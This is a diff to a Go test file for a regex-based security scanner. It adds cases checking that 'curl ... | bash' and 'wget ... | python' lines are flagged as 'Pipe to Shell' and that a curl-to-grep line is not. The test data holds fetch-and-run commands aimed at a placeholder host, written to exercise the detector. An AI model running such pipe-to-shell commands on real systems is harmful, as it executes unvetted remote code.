@@ -37,6 +37,21 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content: "api_key = \"abc1234567890abc1234567890\"",
 			wantFinding: "Generic API Token",
 		},
+		{
+			name:        "Curl Pipe to Bash",
+			content:     "curl -sL https://example.com/install.sh | bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Wget Pipe to Python",
+			content:     "wget -O - https://example.com/script.py | python",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Safe Curl to Grep",
+			content:     "curl https://example.com | grep 'something'",
+			wantFinding: "",
+		},
 	}
 
 	for _, tt := range tests {
